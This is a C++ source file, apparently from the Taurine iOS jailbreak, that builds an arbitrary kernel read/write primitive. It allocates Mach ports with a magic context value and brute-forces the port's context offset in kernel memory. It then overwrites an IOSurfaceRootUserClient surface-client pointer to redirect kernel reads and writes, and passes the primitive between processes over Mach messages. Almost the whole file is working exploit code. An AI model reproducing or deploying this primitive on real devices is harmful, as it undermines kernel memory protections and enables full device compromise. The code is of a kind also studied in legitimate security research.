//
//  KernelRW.cpp
//  Taurine
//
//  Created by tihmstar on 27.02.21.
//

#include "KernelRW.hpp"
#include "macros.h"
#include <thread>
#include <unistd.h>
#include <Foundation/Foundation.h>
#include "iokit.h"
#include "../krw.h"
#include "../offsets.h"

#define READ_CONTEXT_MAGIC 0x4142434445464748

static uint32_t size_ipc_entry = 0x18;
static uint32_t off_IOSurfaceRootUserClient_surfaceClients = 0x118;
static uint32_t off_rw_deref_1 = 0x40;
static uint32_t off_write_deref = 0x360;
static uint32_t off_read_deref  = 0xb4;


#define MAKE_KPTR(v) (v | 0xffffff8000000000)

static uint64_t getPortAddr(mach_port_t port, uint64_t dstTaskAddr, std::function<uint64_t(uint64_t)> kread64){
    uint64_t itkSpace = MAKE_KPTR(kread64(dstTaskAddr + off_task_itk_space));
    uint64_t isTable = MAKE_KPTR(kread64(itkSpace + off_ipc_space_is_table));
    uint32_t portIndex = port >> 8;

    uint64_t portAddr = MAKE_KPTR(kread64(isTable + portIndex*size_ipc_entry));
    return portAddr;
}

struct primpatches{
    KernelRW::patch patch;
    KernelRW::patch backup;
    uint64_t context_write_context_addr;
};

static primpatches getPrimitivepatches(std::function<uint64_t(uint64_t)> kread64, uint64_t dstTaskAddr, mach_port_t context_write_port, mach_port_t context_read_port, mach_port_t IOSurfaceRootUserClient, uint32_t surfaceID){
    primpatches ret = {};
    uint64_t context_write_port_addr = getPortAddr(context_write_port, dstTaskAddr, kread64);
    debug("context_write_port_addr=0x%016llx",context_write_port_addr);
    uint64_t context_read_port_addr = getPortAddr(context_read_port, dstTaskAddr, kread64);
    debug("context_read_port_addr=0x%016llx",context_read_port_addr);

    //bruteforce ip_context_offset
    uint64_t ip_context_offset = 0;
    for (int i=0; i<0x100; i++) {
        if (kread64(context_read_port_addr + i*8) == READ_CONTEXT_MAGIC) {
            ip_context_offset = i*8;
            break;
        }
    }
    retassure(ip_context_offset, "Failed to find ip_context_offset");
    debug("ip_context_offset=0x%016llx",ip_context_offset);

    ret.context_write_context_addr = context_write_port_addr + ip_context_offset;
    debug("ret.context_write_context_addr=0x%016llx",ret.context_write_context_addr);
    uint64_t surface_port_addr = getPortAddr(IOSurfaceRootUserClient, dstTaskAddr, kread64);
    debug("surface_port_addr=0x%016llx",surface_port_addr);

    uint64_t surface_kobject_addr = MAKE_KPTR(kread64(surface_port_addr + off_ipc_port_ip_kobject));
    debug("surface_kobject_addr=0x%016llx",surface_kobject_addr);

    uint64_t surface_clients_array = MAKE_KPTR(kread64(surface_kobject_addr + off_IOSurfaceRootUserClient_surfaceClients));
    debug("surface_clients_array=0x%016llx",surface_clients_array);
    //backup
    ret.backup = {
        .where = surface_clients_array+8*surfaceID,
        .what = kread64(surface_clients_array+8*surfaceID)
    };

    ret.patch = {
        .where = surface_clients_array+8*surfaceID,
        .what = context_read_port_addr + ip_context_offset - off_rw_deref_1
    };

    return ret;
}


KernelRW::KernelRW()
: _task_self_addr(0),
_IOSurfaceRoot(MACH_PORT_NULL), _IOSurfaceRootUserClient(MACH_PORT_NULL),
_context_read_port(MACH_PORT_NULL), _context_write_port(MACH_PORT_NULL),
_IOSurface_id_write(0), _context_write_context_addr(0), _backup{}
{
    kern_return_t kr = KERN_SUCCESS;
    struct IOSurfaceLockResult {
        uint8_t *mem;
        uint8_t *shared_B0;
        uint8_t *shared_40;
        uint32_t surface_id;
        uint8_t _pad2[0x1000];
    } lock_result;
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    } create_args = {
        .alloc_size = (uint32_t) PAGE_SIZE
    };
    size_t lock_result_size = sizeof(IOSurfaceLockResult);

    retassure(_IOSurfaceRoot = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot")), "Failed to open IOSurfaceRoot");
    retassure(!(kr = IOServiceOpen(_IOSurfaceRoot, mach_task_self(), 0, &_IOSurfaceRootUserClient)), "Failed to open IOSurfaceRootUserClient with error=0x%08x",kr);
    do{
        retassure(--lock_result_size, "Failed to find lock_result_size");
        kr = IOConnectCallMethod(
                _IOSurfaceRootUserClient,
                6, // create_surface_client_fast_path
                NULL, 0,
                &create_args, sizeof(create_args),
                NULL, NULL,
                &lock_result, &lock_result_size);
    }while (kr == kIOReturnBadArgument);
    retassure(!kr, "Failed to create_surface_client_fast_path (internal) with error=0x%08x",kr);
    _IOSurface_id_write = lock_result.surface_id;
    debug("IOSurface_id_write=%d",_IOSurface_id_write);

    retassure(!(kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &_context_read_port)), "Failed to alloc context_read_port");
    retassure(!(kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &_context_write_port)), "Failed to alloc context_write_port");
}


KernelRW::~KernelRW(){
    //try to restore backup
    try {
        kwrite64(_backup.where, _backup.what);
    } catch (...) {
        debug("backupt restore *(uint64_t*)(0x%016llx)=0x%016llx failed",_backup.where,_backup.what);
    }

    if (_context_write_port) {
        mach_port_destroy(mach_task_self(), _context_write_port); _context_write_port = MACH_PORT_NULL;
    }
    if (_context_read_port) {
        mach_port_destroy(mach_task_self(), _context_read_port); _context_read_port = MACH_PORT_NULL;
    }
    safeFreeCustom(_IOSurfaceRootUserClient, IOServiceClose);
    safeFreeCustom(_IOSurfaceRoot, IOObjectRelease);
}

KernelRW::patch KernelRW::getPrimitivepatches(std::function<uint64_t(uint64_t)> kread64, uint64_t machTaskSelfAddr){
    kern_return_t kr = KERN_SUCCESS;
    retassure(!(kr = mach_port_set_context(mach_task_self(), _context_read_port, READ_CONTEXT_MAGIC)), "failed to set READ_CONTEXT_MAGIC");
    auto primpatches = ::getPrimitivepatches(kread64, machTaskSelfAddr, _context_write_port, _context_read_port, _IOSurfaceRootUserClient,_IOSurface_id_write);

    _context_write_context_addr = primpatches.context_write_context_addr;
    debug("_context_write_context_addr=0x%016llx",_context_write_context_addr);
    //backup array
    _backup = primpatches.backup;

    _task_self_addr = machTaskSelfAddr;

    return primpatches.patch;
}

typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_port_t context_read_port;
    mach_port_t context_write_port;
    mach_port_t IOSurfaceRootUserClient;
    uint32_t surfaceid;
    uint64_t backupWhere;
    uint64_t backupWhat;
    uint64_t context_write_context_addr;
    uint64_t task_self_addr;
    uint64_t kernel_base_addr;
    uint64_t kernel_proc_addr;
    uint64_t all_proc_addr;
    uint64_t protocolDone;
    uint8_t pad[0x10];
} mymsg_t;
void KernelRW::handoffPrimitivePatching(mach_port_t transmissionPort){
    mach_port_t listenPort = MACH_PORT_NULL;
    cleanup([&]{
        if (listenPort) {
            mach_port_destroy(mach_task_self(), listenPort); listenPort = MACH_PORT_NULL;
        }
    });
    mymsg_t msg = {};
    kern_return_t kr = 0;
    retassure(!(kr = mach_port_set_context(mach_task_self(), _context_read_port, READ_CONTEXT_MAGIC)), "failed to set READ_CONTEXT_MAGIC");
    retassure(!(kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &listenPort)), "Failed to alloc listenPort");
    msg.Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0);
    msg.Head.msgh_id = 1336;
    msg.Head.msgh_remote_port = transmissionPort;

    msg.Head.msgh_local_port = listenPort;
    msg.Head.msgh_size = sizeof(msg) - sizeof(msg.pad);
    msg.msgh_body.msgh_descriptor_count = 0;

    msg.context_read_port = _context_read_port;
    msg.context_write_port = _context_write_port;
    msg.IOSurfaceRootUserClient = _IOSurfaceRootUserClient;
    msg.surfaceid = _IOSurface_id_write;
    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_SEND_MSG, msg.Head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"handoffPrimitivePatching send1 failed with error=0x%08x",kr);
    debug("handoffPrimitivePatching send=0x%08x",kr);
    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_RCV_MSG|MACH_RCV_LARGE, 0, sizeof(msg), listenPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"handoffPrimitivePatching rcv1 failed with error=0x%08x",kr);
    debug("handoffPrimitivePatching rcv=0x%08x",kr);
    retassure(msg.Head.msgh_id == 1337, "received bad msgh_id");
    _backup = {
        .where = msg.backupWhere,
        .what = msg.backupWhat
    };
    _context_write_context_addr = msg.context_write_context_addr;
    _task_self_addr = msg.task_self_addr;
    _kernel_base_addr = msg.kernel_base_addr;
    _kernel_proc_addr = msg.kernel_proc_addr;
    _all_proc_addr = msg.all_proc_addr;

    msg.Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0);
    msg.Head.msgh_id = 1338;
    msg.Head.msgh_remote_port = transmissionPort;

    msg.Head.msgh_local_port = listenPort;
    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_SEND_MSG, msg.Head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"handoffPrimitivePatching send2 failed with error=0x%08x",kr);
    debug("handoffPrimitivePatching send2=0x%08x",kr);

    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_RCV_MSG|MACH_RCV_LARGE, 0, sizeof(msg), listenPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"handoffPrimitivePatching rcv2 failed with error=0x%08x",kr);
    debug("handoffPrimitivePatching rcv2=0x%08x",kr);
    retassure(msg.Head.msgh_id == 1339, "received bad msgh_id");
    retassure(msg.protocolDone == READ_CONTEXT_MAGIC, "bad protocol done magic");
}


void KernelRW::doRemotePrimitivePatching(mach_port_t transmissionPort, uint64_t dstTaskAddr){
    mymsg_t msg = {};
    kern_return_t kr = 0;
    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_RCV_MSG|MACH_RCV_LARGE, 0, sizeof(msg), transmissionPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"doRemotePrimitivePatching rcv1 failed with error=0x%08x",kr);
    debug("doRemotePrimitivePatching rcv=0x%08x",kr);
    retassure(msg.Head.msgh_id == 1336, "received bad msgh_id");

    primpatches ppp = ::getPrimitivepatches([this](uint64_t where)->uint64_t{
        return kread64(where);
    }, dstTaskAddr, msg.context_write_port, msg.context_read_port, msg.IOSurfaceRootUserClient, msg.surfaceid);

    msg.Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0, 0, 0);
    msg.Head.msgh_local_port = MACH_PORT_NULL;
    msg.Head.msgh_id = 1337;
    msg.Head.msgh_size = sizeof(msg) - sizeof(msg.pad);

    msg.backupWhere = ppp.backup.where;
    msg.backupWhat = ppp.backup.what;
    msg.context_write_context_addr = ppp.context_write_context_addr;
    /* mach task self is always the same integer in all processes */
    msg.task_self_addr = dstTaskAddr;
    msg.kernel_base_addr = _kernel_base_addr;
    msg.kernel_proc_addr = _kernel_proc_addr;
    msg.all_proc_addr = _all_proc_addr;
    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_SEND_MSG, msg.Head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"doRemotePrimitivePatching send1 failed with error=0x%08x",kr);
    debug("doRemotePrimitivePatching send=0x%08x",kr);
    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_RCV_MSG|MACH_RCV_LARGE, 0, sizeof(msg), transmissionPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"doRemotePrimitivePatching rcv2 failed with error=0x%08x",kr);
    debug("doRemotePrimitivePatching rcv2=0x%08x",kr);
    retassure(msg.Head.msgh_id == 1338, "received bad msgh_id");

    kwrite64(ppp.patch.where, ppp.patch.what);

    msg.Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0, 0, 0);
    msg.Head.msgh_local_port = MACH_PORT_NULL;
    msg.Head.msgh_id = 1339;
    msg.Head.msgh_size = sizeof(msg) - sizeof(msg.pad);

    msg.protocolDone = READ_CONTEXT_MAGIC;
    retassure(!(kr = mach_msg((mach_msg_header_t*)&msg, MACH_SEND_MSG, msg.Head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)),"doRemotePrimitivePatching send2 failed with error=0x%08x",kr);
    debug("doRemotePrimitivePatching send2=0x%08x",kr);
}

void KernelRW::setOffsets(uint64_t kernelBase, uint64_t kernProc, uint64_t allProc){
    _kernel_base_addr = kernelBase;
    _kernel_proc_addr = kernProc;
    _all_proc_addr = allProc;
}

#ifdef PSPAWN
void KernelRW::getOffsets(uint64_t *kernelBase, uint64_t *kernProc, uint64_t *allProc){
    if (kernelBase){
        *kernelBase = _kernel_base_addr;
    }
    if (kernProc){
        *kernProc = _kernel_proc_addr;
    }
    if (allProc){
        *allProc = _all_proc_addr;
    }
}
#endif
